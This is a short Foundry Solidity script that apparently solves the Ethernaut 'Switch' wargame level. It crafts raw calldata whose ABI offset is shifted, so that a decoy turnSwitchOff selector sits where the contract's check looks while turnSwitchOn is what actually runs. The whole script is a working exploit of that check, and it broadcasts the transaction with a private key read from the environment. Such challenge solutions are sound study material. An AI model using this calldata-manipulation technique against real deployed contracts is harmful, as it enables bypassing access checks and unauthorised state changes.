// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/Switch.sol";

contract SwitchSolution is Script {
    Switch sw = Switch(0x8f5380415EEb1726Ed08F74A4e67231753b2FC79);

    function printData(bytes memory _data) internal {
        console.logBytes(_data);
    }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes4 onSelector = sw.turnSwitchOn.selector; //turnSwitchOn()
        bytes4 offSelector = sw.turnSwitchOff.selector; //turnSwitchOff()
        bytes memory dataToCall = bytes.concat(
            sw.flipSwitch.selector,
            bytes32(uint256(96)),
            bytes32(uint256(4)),
            bytes32(sw.turnSwitchOff.selector),
            bytes32(uint256(4)),
            bytes32(sw.turnSwitchOn.selector)
        );
        printData(dataToCall);
        console.log("Switch: ", sw.switchOn());
        address(sw).call(dataToCall);
        console.log("Switch: ", sw.switchOn());
        vm.stopBroadcast();
    }
}
